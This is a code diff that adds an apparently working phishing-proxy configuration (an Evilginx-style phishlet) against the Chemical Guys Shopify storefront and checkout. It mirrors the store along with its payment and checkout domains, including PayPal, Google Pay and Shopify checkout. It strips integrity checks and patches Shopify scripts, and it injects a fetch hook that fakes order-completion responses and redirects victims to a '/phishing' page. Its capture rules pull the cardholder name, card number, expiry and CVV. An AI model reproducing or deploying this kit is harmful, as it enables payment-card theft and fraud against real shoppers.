@@ -1,0 +1,147 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'chemicalguys.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'checkout2', orig_sub: 'checkout', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn2', orig_sub: 'cdn', domain: 'growthbook.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn3', orig_sub: 'cdn', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api2', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api3', orig_sub: 'api', domain: 'getfondue.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'start', orig_sub: 'start', domain: 'aftersell.app', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sdk-api-proxy', orig_sub: 'sdk-api-proxy', domain: 'postscript.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sdk', orig_sub: 'sdk', domain: 'postscript.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'gorgias.chat', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'config', orig_sub: 'config', domain: 'gorgias.chat', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'klaviyo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true}
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cf-apilb', orig_sub: 'cf-apilb', domain: 'gotolstoy.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www3', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'sp', orig_sub: '', domain: 'shop.app', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'data', orig_sub: 'data', domain: 'replo.app', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'checkout.pci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'extensions', orig_sub: 'extensions', domain: 'shopifycdn.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pay2', orig_sub: 'pay', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'chem-guys', orig_sub: 'chem-guys', domain: 'myshopify.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'atlas', orig_sub: 'atlas', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'hits', orig_sub: 'hits', domain: 'getelevar.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'shopify-gtm-suite', orig_sub: 'shopify-gtm-suite', domain: 'getelevar.com', session: true, is_landing: false, auto_filter: true}
+
+  - {phish_sub: 'player', orig_sub: 'player', domain: 'vimeo.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  #  文件校验问题
+  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: 'integrity=".*?"', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\<script type="importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.chemicalguys.com', orig_sub: 'checkout', domain: 'chemicalguys.com', search: '\<script type="systemjs\-importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'checkout.chemicalguys.com', orig_sub: 'checkout', domain: 'chemicalguys.com', search: 'integrity=".*?"', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'checkout.chemicalguys.com', orig_sub: 'checkout', domain: 'chemicalguys.com', search: '\<script type="importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'checkout.shopify.com', orig_sub: 'checkout', domain: 'shopify.com', search: 'integrity=".*?"', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'checkout.shopify.com', orig_sub: 'checkout', domain: 'shopify.com', search: '\<script type="importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'shop.app', orig_sub: '', domain: 'shop.app', search: 'integrity=".*?"', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'shop.app', orig_sub: '', domain: 'shop.app', search: '\<script type="importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: 'integrity=".*?"', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\<script type="importmap"[\s\S]*?\<\/script\>', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #  按钮重复提交问题
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior==="block"\),', replace: '.behavior===(top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+  # js错误问题
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\!\/\(\^extensions\\', replace: '/(^extensions\', mimes: ['text/html']}
+  - {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: 'start\.aftersell\.app', replace: 'start.chemicalguys.fake.com', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'extensions.shopifycdn.com', orig_sub: 'extensions', domain: 'shopifycdn.com', search: '\!\/\(\^extensions\\', replace: '/(^extensions\', mimes: ['text/html']}
+  - {triggers_on: 'extensions.shopifycdn.com', orig_sub: 'extensions', domain: 'shopifycdn.com', search: 'start\.aftersell\.app', replace: 'start.chemicalguys.fake.com', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+
+#  一键替换
+#  - {.*?orig_sub: '(.*?)', domain: '(.*?)'.*?}
+#  - {triggers_on: '$1.$2', orig_sub: ‘$1', domain: '$2', search: '{hostname}', replace: '{hostname}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ]}
+js_inject:
+  - trigger_domains: ["www.chemicalguys.com"]
+    trigger_paths: ["/checkouts/.*"]
+    script: |
+      if (typeof window !== 'undefined') {
+        top.window.hack = true;
+        const originalFetch = window.fetch;
+
+        const mockRules = [
+          {
+            url: 'SubmitForCompletion',
+            response: {"data":{"submitForCompletion":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970983534820","purchaseOrder":{},"pollDelay":500,"__typename":"ProcessingReceipt"},"__typename":"SubmitSuccess"}}},
+            status: 200
+          },
+          {
+            url: 'PollForReceipt',
+            response: {"data":{"receipt":{"id":"gid://shopify/ProcessedReceipt/1970793545956","action":{"offsiteRedirect":false,"url":"https://www.chemicalguys.fake.com/phishing","__typename":"CompletePaymentChallenge"},"timeout":{"millisecondsRemaining":691074,"__typename":"ActionRequiredReceiptTimeout"},"__typename":"ActionRequiredReceipt"}}},
+            status: 200
+          }
+        ];
+
+        window.fetch = (...args) => {
+          const [input, init] = args;
+          const url = typeof input === 'string' ? input : input.url?input.url:input.href;
+          console.log("请求url:",args, url)
+          const rule = mockRules.find(r => url.includes(r.url));
+
+          if(rule && top.window.hack){
+            return new Promise((resolve, reject) => {
+              console.log(`拦截请求: ${url}，返回 mock 数据`);
+              // 立即给前端返回 mock（前端先用这个继续跑逻辑）
+              resolve(
+                new Response(JSON.stringify(rule.response), {
+                  status: rule.status,
+                  statusText: 'OK',
+                  headers: { 'Content-Type': 'application/json' }
+                })
+              );
+           });
+          }
+
+          // 没匹配的请求走原始 fetch
+          return originalFetch(...args);
+        };
+      }
+
+intercept:
+#  - {domain: 'www.chemicalguys.com', mime: 'text/redirect', body: 'https://bankpage.chemicalguys.fake.com/phishing', path: '\/phishing', http_status: 301}
+  - {domain: 'www.chemicalguys.com', mime: 'text/javascript', body: 'console.log("=============top.window.hack", top.window.hack)', path: '\/phishing', http_status: 301}
+
+auth_tokens:
+  - domain: 'chemicalguys.com'
+    keys: []
+    type: 'cookie'
+credentials:
+  username:
+    key: ''
+    search: '{"credit_card".*?"name":"([^"]*)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '{"credit_card".*?"number":"([^"]*)"'
+    type: 'json'
+  custom:
+    - key: 'month'
+      search: '{"credit_card".*?"month":"([^"]*)"'
+      type: 'json'
+    - key: 'year'
+      search: '{"credit_card".*?"year":"([^"]*)"'
+      type: 'json'
+    - key: 'verification_value'
+      search: '{"credit_card".*?"verification_value":"([^"]*)"'
+      type: 'json'
+    - key: 'number'
+      search: '{"credit_card".*?"number":"([^"]*)"'
+      type: 'json'
+login:
+  domain: 'www.chemicalguys.com'
+  path: '/'
